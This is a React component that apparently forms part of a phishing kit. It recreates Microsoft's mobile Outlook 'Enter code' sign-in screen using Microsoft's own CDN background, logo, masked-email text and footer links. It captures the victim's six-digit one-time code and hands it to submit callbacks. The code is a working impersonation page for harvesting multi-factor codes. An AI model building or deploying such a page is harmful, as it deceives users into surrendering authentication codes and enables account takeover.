import React, { useState, useRef, useEffect } from 'react';
import Spinner from '../common/Spinner';
import { OtpProviderProps, maskEmail, MicrosoftLogo } from './otpUtils';

const MobileOutlookOtp: React.FC<OtpProviderProps> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
  const [resendSent, setResendSent] = useState(false);
  const [codeValue, setCodeValue] = useState('');
  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);

  const handleResend = () => {
    if (onResend) {
      onResend();
      setResendSent(true);
      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
    }
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
    setCodeValue(val);
    onOtpComplete(val);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fff', backgroundImage: "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')", backgroundSize: 'cover', backgroundRepeat: 'no-repeat', backgroundPosition: 'center center', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
      <div className="flex-1 flex flex-col justify-center px-4 py-8">
        <div className="bg-white p-6" style={{ boxShadow: '0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .2px .9px 0 rgba(0,0,0,.108)' }}>
          <div className="mb-4">
            <MicrosoftLogo />
          </div>

          {email && (
            <div className="flex items-center gap-2 mb-4 cursor-pointer">
              <svg className="w-3 h-3 text-gray-800 flex-shrink-0" viewBox="0 0 16 16" fill="currentColor"><path d="M11.3 1.3L5.6 7l5.7 5.7-1 1L3.6 7l6.7-6.7z" /></svg>
              <span className="text-sm text-gray-800">{email}</span>
            </div>
          )}

          <h1 className="text-xl text-gray-900 mb-2" style={{ fontWeight: 600, fontSize: '24px', lineHeight: '1.3' }}>Enter code</h1>

          {email && (
            <p className="text-sm text-gray-800 mb-4" style={{ fontSize: '15px', lineHeight: '20px' }}>
              We sent a code to <span className="font-semibold">{maskEmail(email)}</span>
            </p>
          )}

          <form onSubmit={onSubmit}>
            {errorMessage && (
              <div className="mb-3 text-sm" style={{ color: '#e81123' }}>
                <span>{errorMessage}</span>
              </div>
            )}

            <div className="mb-5">
              <input
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                placeholder="Code"
                value={codeValue}
                onChange={handleCodeChange}
                disabled={isLoading}
                autoFocus
                className="w-full px-3 py-2 text-base border border-gray-400 focus:border-[#0067B8] focus:outline-none disabled:bg-gray-100"
                style={{ fontFamily: 'inherit', fontSize: '15px', height: '36px', borderRadius: '0' }}
              />
            </div>

            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-1.5 px-4 text-white text-sm font-semibold disabled:opacity-50 transition-colors" style={{ backgroundColor: '#0067B8', borderRadius: '0', height: '36px', fontSize: '15px' }}>
              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
              {isLoading ? 'Signing in...' : 'Sign in'}
            </button>
          </form>

          <div className="mt-4">
            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#0067B8', fontSize: '13px' }}>
              {resendSent ? 'Code resent successfully' : "I didn't get a code"}
            </button>
          </div>
        </div>

        <div className="mt-4 flex items-center justify-end gap-3 text-xs text-gray-500">
          <a href="https://go.microsoft.com/fwlink/?LinkID=2259814" target="_blank" rel="noopener noreferrer">Terms of use</a>
          <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank" rel="noopener noreferrer">Privacy & cookies</a>
          <span className="text-gray-400">···</span>
        </div>
      </div>
    </div>
  );
};

export default MobileOutlookOtp;
